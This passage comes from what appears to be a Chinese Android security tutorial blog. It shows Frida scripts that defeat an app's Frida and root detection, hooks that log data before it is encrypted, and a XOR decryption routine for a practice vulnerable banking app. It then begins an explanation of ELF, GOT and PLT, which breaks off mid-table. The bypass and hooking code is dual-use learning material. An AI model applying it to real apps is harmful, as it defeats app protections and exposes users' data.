class=\"line\">（3）成功返回ture</span><br></pre></td></tr></table></figure>\n\n<p>绕过此处root方式很多，比如该程序没有签名校验机制，最简单直接修改代码，反编译，这里我们为了学习，通过hook技术，比如Xposed可以绕过，但是经过前面分析，该APP有frida检测，那我们就使用frida来进行测试</p>\n<h3 id=\"3-过frida检测\"><a href=\"#3-过frida检测\" class=\"headerlink\" title=\"3.过frida检测\"></a>3.过frida检测</h3><p>我们随便创建一个js脚本，然后启动frida</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/75.png\" alt=\"image-20220418133314857\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/76.png\" alt=\"image-20220418133401493\"></p>\n<p>发现程序检测到Frida在运行，然后直接崩溃，我们进一步分析Frida检测的代码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/77.png\" alt=\"image-20220418133529649\"></p>\n<p>可以发现主要是<code>fridaCheck（）这个函数</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/78.png\" alt=\"image-20220418133622096\"></p>\n<p>进一步分析，可以发现该方法是native方法，因此我们进一步进入so层分析，我们打开<code>frida-check</code>so文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/79.png\" alt=\"image-20220418133837056\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/80.png\" alt=\"image-20220418134004354\"></p>\n<p>没有<code>JNI_Onload</code>程序是静态注册</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/81.png\" alt=\"image-20220418135758838\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/82.png\" alt=\"image-20220418140558354\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/83.png\" alt=\"image-20220418141203374\"></p>\n<p>代码逻辑很简单：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）函数的返回值为result</span><br><span class=\"line\">（2）v2值给result</span><br><span class=\"line\">（3）connect函数是否&gt;=0决定最后程序的返回值为true还是false</span><br><span class=\"line\">（4）addr值可以发现就是结构体的首地址，即为0xA2690002</span><br><span class=\"line\">（5）我们需要考虑二进制文件中的大小端序的问题，需要将值进一步的转变，将8位分为两半0xA269和0x0002,然后变为十进制，前面变为0x69A2，即27042</span><br><span class=\"line\">（6）所以我们可以发现connect使用该值就是其端口号27042</span><br><span class=\"line\">总结，APP检测Frida是否运行在27042的套接字上，如果允许在上面就返回true，从而可以判断程序在使用frida,然后关闭程序</span><br></pre></td></tr></table></figure>\n\n<p>这里我们分析结束，很简单只需要不将frida_server运行在27042端口上即可</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/84.png\" alt=\"image-20220418141845557\"></p>\n<p>再次启动frida看是否生效</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/85.png\" alt=\"image-20220418142257172\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/86.png\" alt=\"image-20220418142344312\"></p>\n<p>此时我们发现程序frida并未检测到，这说明我们上面的分析是正确的</p>\n<p>接下来只需要编写hook代码，将root检测绕过即可</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">test</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> class_obj = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;a.a.a.a.a&quot;</span>);</span><br><span class=\"line\">        class_obj.<span class=\"property\">R</span>.<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">this</span>.<span class=\"title function_\">R</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;result:&quot;</span>+result);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\">params</span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_\">test</span>()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/87.png\" alt=\"image-20220418143707200\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/88.png\" alt=\"image-20220418143751714\"></p>\n<p>这里我们就发现成功的hook程序，进入了正常的界面</p>\n<h3 id=\"4-过Xposed检测\"><a href=\"#4-过Xposed检测\" class=\"headerlink\" title=\"4.过Xposed检测\"></a>4.过Xposed检测</h3><p>过Xposed检测详细可以参考文章：<a href=\"https://bbs.pediy.com/thread-269627.htm\">Xposed定制</a></p>\n<h2 id=\"五、过反调试的APP漏洞挖掘\"><a href=\"#五、过反调试的APP漏洞挖掘\" class=\"headerlink\" title=\"五、过反调试的APP漏洞挖掘\"></a>五、过反调试的APP漏洞挖掘</h2><p>案例：漏洞银行.apk</p>\n<p>前面我们采用了一些方法进行了反调试绕过，这里我们拿漏洞银行的例子，去联合我们前面的漏洞挖掘技巧和反调试技巧，展现如何过反调试后挖掘Android里面的一些漏洞</p>\n<h3 id=\"1-加密传输漏洞\"><a href=\"#1-加密传输漏洞\" class=\"headerlink\" title=\"1.加密传输漏洞\"></a>1.加密传输漏洞</h3><p>经过我们上篇帖子，讲述了如何解决抓包中的安全防护绕过问题，参考<a href=\"https://bbs.pediy.com/thread-272270.htm\">Android APP漏洞之战（9）——验证码漏洞挖掘详解</a>,当我们绕过这些常见的抓包防护后，最后就是hook和算法还原，我们前面也绕过了hook检测</p>\n<p>我们配置好抓包环境：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/98.png\" alt=\"image-20220418160104970\"></p>\n<p>我们使用burpsuit进行抓包：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/99.png\" alt=\"image-20220418160147202\"></p>\n<p>我们发现这里是加密的字段，我们可以全文搜索<code>enc_data</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/100.png\" alt=\"image-20220418160330922\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/101.png\" alt=\"image-20220418160416195\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/102.png\" alt=\"image-20220418160603102\"></p>\n<h4 id=\"（1）hook方法\"><a href=\"#（1）hook方法\" class=\"headerlink\" title=\"（1）hook方法\"></a>（1）hook方法</h4><p>我们就可以定位到<code>e</code>类中的两个函数段,这样我们只需要对这两处函数进行hook，将参数打印出来就是我们传输的字符串了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">hookentry</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> class_obj = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;c.b.a.e&quot;</span>);</span><br><span class=\"line\">        class_obj.<span class=\"property\">a</span>.<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span> (<span class=\"params\">arg0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">this</span>.<span class=\"title function_\">a</span>(arg0);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;arg0_a:&quot;</span>+arg0);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;result_a:&quot;</span>+result)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        class_obj.<span class=\"property\">b</span>.<span class=\"property\">implementation</span> = <span class=\"keyword\">function</span> (<span class=\"params\">arg0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"variable language_\">this</span>.<span class=\"title function_\">b</span>(arg0);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;arg0_b:&quot;</span>+arg0);</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;result_b:&quot;</span>+result)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/103.png\" alt=\"image-20220418161219954\"></p>\n<p>我们进行注册：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/104.png\" alt=\"image-20220418161319462\"></p>\n<p>先看抓包情况：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/105.png\" alt=\"image-20220418161407839\"></p>\n<p>再看脚本hook值：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/106.png\" alt=\"image-20220418161440033\"></p>\n<p>这样我们就成功的将加密前的数据和加密后的数据打印出来了</p>\n<p>我们通过动态调试验证一样</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/107.png\" alt=\"image-20220418195256625\"></p>\n<h4 id=\"（2）算法还原方法\"><a href=\"#（2）算法还原方法\" class=\"headerlink\" title=\"（2）算法还原方法\"></a>（2）算法还原方法</h4><p>上面我们利用hook的方法成功的获得解密后的数据，一般在做逆向开发过程时，还可以通过编写解密函数来实现解密</p>\n<p>首先我们要分析加密逻辑</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/108.png\" alt=\"image-20220418162723283\"></p>\n<p>我们可以发现这里就是先通过c函数进行加密，然后使用base64进行加密</p>\n<p>编写解密函数：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">SECRET</span> = <span class=\"string\">&#x27;amazing&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">SECRET_LENGTH</span> = <span class=\"variable constant_\">SECRET</span>.<span class=\"property\">length</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">operate</span> = (<span class=\"params\">input</span>) =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> result = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> input) &#123;</span><br><span class=\"line\">    result += <span class=\"title class_\">String</span>.<span class=\"title function_\">fromCharCode</span>(input.<span class=\"title function_\">charCodeAt</span>(i)^<span class=\"variable constant_\">SECRET</span>.<span class=\"title function_\">charCodeAt</span>(i%<span class=\"variable constant_\">SECRET_LENGTH</span>));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">decrypt</span> = (<span class=\"params\">encodedInput</span>) =&gt; &#123;  </span><br><span class=\"line\">  <span class=\"keyword\">let</span> input = <span class=\"title class_\">Buffer</span>.<span class=\"title function_\">from</span>(encodedInput, <span class=\"string\">&#x27;base64&#x27;</span>).<span class=\"title function_\">toString</span>();</span><br><span class=\"line\">  <span class=\"keyword\">let</span> dec = <span class=\"title function_\">operate</span>(input);</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(dec);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> dec;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">decrypt</span>(<span class=\"string\">&quot;Gk8UCQwcCQAABFhTTBQHHhIJS0JFEQwSCR4BFQVPW1gaCAFDEA==&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/109.png\" alt=\"image-20220418165727819\"></p>\n<p>这样也可以成功的解密</p>\n<h3 id=\"2-敏感信息披露漏洞\"><a href=\"#2-敏感信息披露漏洞\" class=\"headerlink\" title=\"2.敏感信息披露漏洞\"></a>2.敏感信息披露漏洞</h3><p>我们在前面的文章中也讲述了此类漏洞问题，主要是因为应用中采用了硬编码导致的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell ps -ef | grep damn</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/110.png\" alt=\"image-20220418170232927\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb logcat | grep 8992</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/111.png\" alt=\"image-20220418184948147\"></p>\n<p>这里我们可以发现，可以获取部分的敏感信息</p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文总结并一一分析了当下Android APP中常见的防护策略，并通过案例实操实现了反调试策略的过反调，学习并掌握本节可以更加进一步助力Android APP漏洞挖掘中的漏洞学习，最后我们将反调试技巧和漏洞挖掘实例进行结合，并实操了案例，本文后续会将实验案例逐一上传到知识星球中。</p>\n<p>github首页：<a href=\"https://github.com/WindXaa/Android-Vulnerability-Mining\">github</a></p>\n<h2 id=\"七、参考文献\"><a href=\"#七、参考文献\" class=\"headerlink\" title=\"七、参考文献\"></a>七、参考文献</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-225717.htm</span><br><span class=\"line\">https://nszdhd1.github.io/2020/03/09/Magisk%E6%A3%80%E6%B5%8B/</span><br><span class=\"line\">https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/</span><br><span class=\"line\">https://www.jianshu.com/p/f679cb404524</span><br><span class=\"line\">https://bbs.pediy.com/thread-269862.htm#msg_header_h3_4</span><br><span class=\"line\">https://bbs.pediy.com/thread-270269.htm</span><br><span class=\"line\">https://juejin.cn/post/6844903733248131079#heading-5</span><br><span class=\"line\">https://bbs.pediy.com/thread-268586.htm</span><br><span class=\"line\">https://blog.51cto.com/u_15308480/3140020</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（6）——（Hook篇）常见的Hook技术详解","url":"/2023/02/09/bug0006/","content":"<p>[TOC]</p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近一段时间在研究Android加壳和脱壳技术，其中涉及到了一些hook技术，于是将自己学习的一些hook技术进行了一下梳理，以便后面回顾和大家学习。</p>\n<p>本文第二节主要讲述编译原理，了解编译原理可以帮助进一步理解hook技术</p>\n<p>本文第三节主要讲述NDK开发的一些基础知识</p>\n<p>本文第四节主要讲述各类hook技术的实现原理</p>\n<p>本文第五节主要讲述各hook技术的实现步骤和案例演示</p>\n<span id=\"more\"></span>\n<h2 id=\"二、编译原理\"><a href=\"#二、编译原理\" class=\"headerlink\" title=\"二、编译原理\"></a>二、编译原理</h2><h3 id=\"1-编译过程\"><a href=\"#1-编译过程\" class=\"headerlink\" title=\"1.编译过程\"></a>1.编译过程</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/1.png\" alt=\"image-20210918161352124\"></p>\n<p>我们可以借助gcc来实现上面的过程：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">预处理阶段：预处理器（cpp）根据以字符#开头的命令修给原始的C程序，结果得到另一个C程序，通常以.i作为文件扩展名。主要是进行文本替换、宏展开、删除注释这类简单工作。 </span><br><span class=\"line\">\t命令行：gcc -E hello.c hello.i</span><br><span class=\"line\">编译阶段：将文本文件hello.i翻译成hello.s，包含相应的汇编语言程序</span><br><span class=\"line\">汇编阶段：将.S文件翻译成机器指令，然后把这些指令打包成一种可重定位目标程序的格式，并把结果保存在目标文件.o中（汇编——&gt;机器）</span><br><span class=\"line\">\t命令行：gcc -c hello.c hello.o</span><br><span class=\"line\">链接阶段：hello程序调用了printf函数，链接器（Id）就把printf.o文件并入hello.o文件中，得到hello可执行文件，然后加载到存储器中由系统执行。</span><br><span class=\"line\">\t函数库包括静态库和动态库</span><br><span class=\"line\">\t静态库：编译链接时，把库文件代码全部加入可执行文件中，运行时不需要库文件，后缀为.a。</span><br><span class=\"line\">\t动态库：编译链接时，不加入，在程序执行时，由运行时链接文件加载库，这样节省开销，后缀为.so。（gcc编译时默认使用动态库）</span><br><span class=\"line\">再经过汇编器和连接器的作用后输出一个目标文件，这个目标文件为可执行文件</span><br></pre></td></tr></table></figure>\n\n<p>这里我们对编译过程做了一个初步的讲解，详细大家可以去看《程序员的自我修养——链接、装载与库》一书，下面我们主要介绍链接方式、链接库、可执行目标文件几个基本概念。</p>\n<h4 id=\"（1）链接方式\"><a href=\"#（1）链接方式\" class=\"headerlink\" title=\"（1）链接方式\"></a>（1）链接方式</h4><p><strong>静态链接：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">对于静态库，程序在编译链接时，将库的代码链接到可执行文件中，程序运行时不再需要静态库。在使用过程中只需要将库和我们的程序编译后的文件链接在一起就可形成一个可执行文件。</span><br></pre></td></tr></table></figure>\n\n<p><strong>缺点：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>、内存和磁盘空间浪费：静态链接方式对于计算机内存和磁盘的空间浪费十分严重。假如一个c语言的静态库大小为1MB，系统中有<span class=\"number\">100</span>个需要使用到该库文件，采用静态链接的话，就要浪费进100M的内存，若数量再大，那浪费的也就更多。</span><br><span class=\"line\"><span class=\"number\">2.</span>更新麻烦：比如一个程序<span class=\"number\">20</span>个模块，每个模块只有1MB，那么每次更新任何一个模块，用户都得重新下载20M的程序</span><br></pre></td></tr></table></figure>\n\n<p><strong>动态链接：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">由于静态链接具有浪费内存和模块更新困难等问题，提出了动态链接。基本实现思想是把程序按照模块拆分成各个相对独立部分，在程序运行时才将他们链接在一起形成一个完整的程序，而不是像静态链接那样把所有的程序模块都链接成一个单独的可执行文件。所以动态链接是将链接过程推迟到了运行时才进行。</span><br></pre></td></tr></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">同样，假如有程序1，程序2，和Lib.o三个文件，程序1和程序2在执行时都需要用到Lib.o文件，当运行程序1时，系统首先加载程序1，当发现需要Lib.o文件时，也同样加载到内存，再去加载程序2当发现也同样需要用到Lib.o文件时，则不需要重新加载Lib.o，只需要将程序2和Lib.o文件链接起来即可，内存中始终只存在一份Lib.o文件。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/2.png\" alt=\"image-20210918161352124\"></p>\n<p>优点：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）毋庸置疑的就是节省内存；</span><br><span class=\"line\">（<span class=\"number\">2</span>）减少物理页面的换入换出；</span><br><span class=\"line\">（<span class=\"number\">3</span>）在升级某个模块时，理论上只需要将对应旧的目标文件覆盖掉即可。新版本的目标文件会被自动装载到内存中并且链接起来；</span><br><span class=\"line\">（<span class=\"number\">4</span>）程序在运行时可以动态的选择加载各种程序模块，实现程序的扩展。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）链接库\"><a href=\"#（2）链接库\" class=\"headerlink\" title=\"（2）链接库\"></a>（2）链接库</h4><p>我们在链接的过程中，一般会链接一些库文件，主要分为静态链接库和动态链接库。静态链接库一般为<code>Windows下的.lib和Linux下的.a</code>,动态链接库一般为<code>Windows下的.dll和Linux下的.so</code>，这里考虑到我们主要是对so文件hook讲解，下面我们主要介绍linux系统下的情况。</p>\n<p><strong>静态库：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">命名规范为libXXX.a</span><br><span class=\"line\">库函数会被连接进可执行程序，可执行文件体积较大</span><br><span class=\"line\">可执行文件运行时，不需要从磁盘载入库函数，执行效率较高</span><br><span class=\"line\">库函数更新后，需要重新编译可执行程序</span><br></pre></td></tr></table></figure>\n\n<p><strong>动态库：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">命名规范为libXXX.so</span><br><span class=\"line\">库函数不被连接进可执行程序，可执行文件体积较小</span><br><span class=\"line\">可执行文件运行时，库函数动态载入</span><br><span class=\"line\">使用灵活，库函数更新后，不需要重新编译可执行程序</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-可执行文件（ELF）\"><a href=\"#2-可执行文件（ELF）\" class=\"headerlink\" title=\"2.可执行文件（ELF）\"></a>2.可执行文件（ELF）</h3><p>目前PC平台比较流行的可执行文件格式主要是Windows下的PE和Linux下的ELF，它们都是COFF格式的变种。在Windows平台下就是我们比较熟悉的.exe文件，而Linux平台下现在便是统称的ELF文件。这里我们主要介绍一下Linux下的ELF文件。</p>\n<p><strong>ELF文件的类型：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">可重定位目标文件：包含二进制代码和数据，其形式可以和其他目标文件进行合并，创建一个可执行目标文件。比如linux下的.o文件</span><br><span class=\"line\">可执行目标文件：包含二进制代码和数据，可直接被加载器加载执行。 比如/bin/sh文件</span><br><span class=\"line\">共享目标文件：可被动态的加载和链接。比如.so文件</span><br></pre></td></tr></table></figure>\n\n<p><strong>ELF文件的结构：</strong></p>\n<p>elf文件在不同的平台上有不同的格式，在Unix和x86-64 Linux上称ELF：</p>\n<h4 id=\"（1）ELF文件结构\"><a href=\"#（1）ELF文件结构\" class=\"headerlink\" title=\"（1）ELF文件结构\"></a>（1）ELF文件结构</h4><p>目标文件既要参与程序链接，又要参与程序执行：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/3.png\" alt=\"image-20220517112124280\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)文件开始处：是一个ELF头部（ELF Header），用来描述整个文件的组织。节区部分包含链接视图的大量信息：指令、数据、符号表、重定位信息等。</span><br><span class=\"line\">(<span class=\"number\">2</span>)程序头部表(Program Header Table)：如果存在的话，会告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。</span><br><span class=\"line\">(<span class=\"number\">3</span>)节区头部表(Section Header Table)：包含了描述文件节区的信息，每个节区在表中都有一项，每一项给出诸如节区名称、节区大小这类信息。用于链接的目标文件必须包含节区头部表，其他目标文件可以有，也可以没有这个表。</span><br></pre></td></tr></table></figure>\n\n<p>下面我们来从分别从连接视角和程序执行的视角来看ELF文件：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/4.png\" alt=\"image-20210918161352124\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ELF Header:描述了描述了体系结构和操作系统等基本信息并指出Section Header Table和Program Header Table在文件中的什么位置</span><br><span class=\"line\">Program Header Table: 保存了所有Segment的描述信息；在汇编和链接过程中没有用到，所以是可有可无的</span><br><span class=\"line\">Section Header Table:保存了所有Section的描述信息；Section Header Table在加载过程中没有用到，所以是可有可无的</span><br></pre></td></tr></table></figure>\n\n<p>下面我们来看一张更加详细的ELF结构图</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/5.png\" alt=\"image-20210918161352124\"></p>\n<p>从中我们可以详细的知道ELF文件各个字段的含义，其他字段的含义如下图</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/6.png\" alt=\"image-20210918161352124\"></p>\n<h4 id=\"（2）GOT和PLT\"><a href=\"#（2）GOT和PLT\" class=\"headerlink\" title=\"（2）GOT和PLT\"></a>（2）GOT和PLT</h4><p>上面我们简单的分析了ELF的文件结构，而这里我们介绍一下其中两个重要的节表<code>GOT(全局偏移表)</code>和<code>PLT(程序链接表)</code></p>\n<p>首先，我们需要理解为什么需要GOT表和PLT表</p>\n<p>经过上面的分析，我们知道程序在经历了编译流程后，就来到了链接过程，链接过程就是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，主要要完成以下事情：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.各个中间文之间的同名section合并</span><br><span class=\"line\">2.对代码段，数据段以及各符号进行地址分配</span><br><span class=\"line\">3.链接时重定位修正</span><br></pre></td></tr></table></figure>\n\n<p>但是当我们程序运行起来，<code>glibc</code>动态库也装载了，函数地址也确定了，那我们程序如何去调用动态库中的函数呢，这个时候就需要理解一下重定位的概念：</p>\n<p><strong>重定位：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.链接重定位：将一个或多个中间文件(.o文件)通过链接器将它们链接成一个可执行文件，一般分为两种情况：</span><br><span class=\"line\">\t（1）如果是在其他中间文件中已经定义了的函数，链接阶段可以直接重定位到函数地址，比如我们从头文件访问另一个函数</span><br><span class=\"line\">\t（2）如果是在动态库中定义了的函数，链接阶段无法直接重定位到函数地址，只能生成额外的小片段代码，也就是PLT表，然后重定位到该代码片段</span><br><span class=\"line\">2.运行重定位：运行后加载动态库，把动态库中的相应函数地址填入GOT表，由于PLT表是跳转到GOT表的，这就构成了运行时重定位</span><br><span class=\"line\">3.延迟重定位：只有动态库函数在被调用时，才会进行地址解析和重定位工作，这时候动态库函数的地址才会被写入到GOT表项中</span><br></pre></td></tr></table></figure>\n\n<p>这里我们就可以明白流程，程序在加载动态库中函数时，需要两部分：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">需要存放外部函数的代码段表（PLT表）</span><br><span class=\"line\">存放函数地址的数据表（GOT表）</span><br></pre></td></tr></table></figure>\n\n<p>这里我用一个实例加深大家的理解，例如程序在链接时发现scanf定义在动态库时，链接器生成一小段代码scanf_stub,这就是我们的PLT表，然后scanf_stub地址取代原来的scanf,因此程序此时就转换为链接scanf_stub，这个过程叫链接重定位，然后在运行时动态库glibc中的scanf_libc地址填入GOT表，然后程序通过scanf_stub访问到scanf_libc，这个过程叫运行时重定位。</p>\n<p>讲到这里，其实我们对PLT和GOT表的作用已经了解了，<code>PLT（程序链接表）</code>就是链接时需要存放外部函数的数据段，<code>GOT（全局偏移表）</code>是存放函数地址的代码</p>\n<p><strong>PLT和GOT的结构：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PLT表中的第一项为公共表项，剩下的是每个动态库函数为一项,每项PLT都从对应的GOT表项中读取目标函数地址</span><br><span class=\"line\"></span><br><span class=\"line\">GOT表中前3个为特殊项，分别用于保存 .dynamic段地址、本镜像的link_map数据结构地址和_dl_runtime_resolve函数地址</span><br><span class=\"line\">dynamic段：提供动态链接的信息，例如动态链接中各个表的位置</span><br><span class=\"line\">link_map：已加载库的链表，由动态库函数的地址构成的链表</span><br><span class=\"line\">_dl_runtime_resolve：在第一次运行时进行地址解析和重定位工作</span><br></pre></td></tr></table></figure>\n\n<p>根据操作系统规定不允许修改代码段，只能修改数据段，所以PLT表是不变的，GOT表是可以改变的</p>\n<table>\n<thead>\n<tr>\n<th>.plt</th>\n<th>代码段</th>\n<th>RE（可读，可执行）</th>\n<th>.plt section 实际就是通常所说的过程链接表（Procedure Linkage Table, PLT）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>.plt.got</td>\n<td>代码段</td>\n<td>RE</td>\n<td>.plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目</td>\n</tr>\n<tr>\n<td>.got</td>\n<td>数据段</td>\n<td>RW（可读，可写）</td>\n<td>.got section 中可以用于存放全局变量的地址；.got section 中也可以用于存放不需要延迟绑定的函数的地址。</td>\n</tr>\n<tr>\n<td>.got.plt</td>\n<td>数据段</td>\n<td>RW</td>\n<td>.got.plt section 